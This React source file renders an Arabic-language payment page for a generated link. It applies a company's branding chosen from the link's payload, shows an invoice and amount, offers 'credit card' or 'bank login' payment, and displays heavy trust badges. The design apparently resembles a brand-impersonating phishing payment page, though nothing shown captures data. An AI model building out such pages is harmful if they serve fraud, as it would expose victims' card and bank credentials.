import React from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import { getPaymentData } from "@/utils/paymentData";
import SEOHead from "@/components/SEOHead";
import {
  CreditCard,
  CheckCircle2,
  Shield,
  Sparkles,
  DollarSign,
  Hash,
  Building2,
} from "lucide-react";

const PaymentMicrosite = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;
  const countryCode = link.country_code || payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);

  const paymentInfo = getPaymentData(link);
  const amount = paymentInfo.amount;
  
  const serviceKey = payload?.service_key || 'payment';
  const serviceBranding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const paymentTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f5f3ff"
  };

  const handleProceedToPayment = () => {
    navigate(`/pay/${id}/recipient?company=${serviceKey}&currency=${countryData?.currency || 'SAR'}`);
  };

  return (
    <>
      <SEOHead
        title={`خدمة السداد - ${payload?.invoice_number || 'فاتورة'}`}
        description="خدمة سداد آمنة ومحمية - ادفع فاتورتك بسهولة"
        ogImage={serviceBranding.ogImage}
        company={serviceKey}
      />
      
      <div className="min-h-screen py-8" dir="rtl" style={{ background: `linear-gradient(to bottom, ${paymentTheme.bgLight}, white)` }}>
        <div className="container mx-auto px-4 max-w-2xl">
          <Card className="overflow-hidden shadow-2xl border-2" style={{ borderColor: `${paymentTheme.primary}30` }}>
            <div
              className="h-32 relative"
              style={{ background: paymentTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex flex-col items-center justify-center text-white">
                <CreditCard className="w-12 h-12 mb-2" />
                <h1 className="text-2xl font-bold">خدمة السداد</h1>
                <p className="text-sm opacity-90">نظام دفع آمن ومحمي</p>
              </div>
            </div>

            <div className="p-6 space-y-6">
              <div className="flex items-center gap-2 justify-center">
                <Badge className="text-xs px-3 py-1" style={{ background: `${paymentTheme.primary}20`, color: paymentTheme.primary }}>
                  <CheckCircle2 className="w-3 h-3 ml-1" />
                  موثوق
                </Badge>
                <Badge className="text-xs px-3 py-1" style={{ background: `${paymentTheme.primary}20`, color: paymentTheme.primary }}>
                  <Shield className="w-3 h-3 ml-1" />
                  آمن
                </Badge>
              </div>

              <div className="space-y-4">
                <div className="p-5 rounded-xl" style={{ background: paymentTheme.bgLight }}>
                  <div className="space-y-3">
                    {payload?.invoice_number && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Hash className="w-4 h-4" />
                          الرقم المفوتر:
                        </span>
                        <span className="font-bold text-base">{payload.invoice_number}</span>
                      </div>
                    )}
                    
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-muted-foreground flex items-center gap-2">
                        <DollarSign className="w-4 h-4" />
                        المبلغ المطلوب:
                      </span>
                      <span className="font-bold text-2xl" style={{ color: paymentTheme.primary }}>
                        {formatCurrency(amount, countryData?.currency || 'SAR')}
                      </span>
                    </div>

                    {payload?.payment_method && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Building2 className="w-4 h-4" />
                          طريقة الدفع:
                        </span>
                        <span className="font-semibold text-sm">
                          {payload.payment_method === 'card' ? 'بطاقة ائتمان' : 'تسجيل دخول البنك'}
                        </span>
                      </div>
                    )}
                  </div>
                </div>

                <div className="flex items-center gap-2 text-xs text-muted-foreground justify-center">
                  <Shield className="w-4 h-4" style={{ color: paymentTheme.primary }} />
                  <span>جميع المعاملات محمية بتشفير SSL</span>
                </div>

                <Button
                  onClick={handleProceedToPayment}
                  className="w-full py-7 text-lg font-bold shadow-xl hover:shadow-2xl transition-all text-white"
                  style={{ background: paymentTheme.gradient }}
                >
                  <CreditCard className="w-5 h-5 ml-2" />
                  <span>متابعة عملية السداد</span>
                </Button>

                <div className="pt-4 border-t text-center space-y-2">
                  <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                    <div className="flex items-center gap-1">
                      <Shield className="w-3 h-3" />
                      <span>آمن 100%</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <CheckCircle2 className="w-3 h-3" />
                      <span>موثوق</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <Sparkles className="w-3 h-3" />
                      <span>سريع</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default PaymentMicrosite;
